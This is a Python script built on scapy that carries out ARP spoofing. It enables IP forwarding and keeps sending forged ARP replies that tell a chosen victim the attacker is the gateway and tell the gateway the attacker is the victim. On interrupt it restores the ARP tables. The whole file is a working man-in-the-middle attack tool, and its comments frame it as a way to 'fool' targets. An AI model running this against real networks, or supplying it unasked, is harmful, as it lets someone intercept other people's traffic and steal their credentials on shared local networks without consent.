#!/usr/bin/env python
import time
import subprocess
import argparse
import scapy.all as scapy


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    # with this function, scapy.srp() we send packets and receive the answer
    # [0] is set as we need just the first list only.
    #  With verbose=false the top of the information is not printed out
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc  # Retrieving the mac-address of the ip given


def spoof(target_ip, target_MAC, spoof_ip, spoof_mac):
    # op=2 to creat an ARP response
    # pdst -> ip target the one to fool
    # hwdst -> mac target the one to fool
    # psrc -> ip to simulate
    # For more info print(packet.show())
    # For more info print(packet.summary())
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_MAC if target_MAC else get_mac(target_ip),
                       psrc=spoof_ip, hwsrc=spoof_mac if spoof_mac else None)
    scapy.send(packet, verbose=False)


def restore(destination_ip, destination_MAC, source_ip, source_mac):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip),
                             psrc=source_ip, hwsrc=get_mac(source_ip))
    scapy.send(packet, verbose=False)


parser = argparse.ArgumentParser(description="ARP spoof")
parser.add_argument('-tip', '--targetIP', dest='target_ip', help="Target ip to fool")
parser.add_argument('-tmac', '--targetMAC', dest='target_mac', help="Target MAC address to fool")
parser.add_argument('-spip', '--spoofIP', dest='spoof_ip', help="Target ip to spoof")
parser.add_argument('-spmac', '--spoofMAC', dest='spoof_mac', help="Target MAC address to spoof")


target_ip = parser.parse_args().target_ip
target_MAC = parser.parse_args().target_mac
gateway_ip = parser.parse_args().spoof_ip
spoof_mac = parser.parse_args().spoof_mac

ip_forward_flag = False
if int(subprocess.run(["cat", "/proc/sys/net/ipv4/ip_forward"], capture_output=True).stdout.decode()) == 0:
    ipv4 = subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
    print(ipv4.stdout.decode().replace("net.ipv4.", "ipv4 "))
else:
    ip_forward_flag = True
sent_packets_count = 0
try:
    while True:
        spoof(target_ip, target_MAC, gateway_ip, spoof_mac)  # telling the victim we're the router
        spoof(gateway_ip, spoof_mac, target_ip, target_MAC)  # telling the router we're the victim
        sent_packets_count = sent_packets_count + 2
        print("[+] Packets sent: " + str(sent_packets_count), end='\r')
        time.sleep(2)
except KeyboardInterrupt:
    print("\r[-] Detected CTRL + C ... Restoring ARP tables... quiting", end='\n\n')
    restore(target_ip, target_MAC, gateway_ip, spoof_mac)
    restore(gateway_ip, spoof_mac, target_ip, target_MAC)
    if not ip_forward_flag:
        ipv4 = subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
        print(ipv4.stdout.decode().replace("net.ipv4.", "Returning ipv4 "))

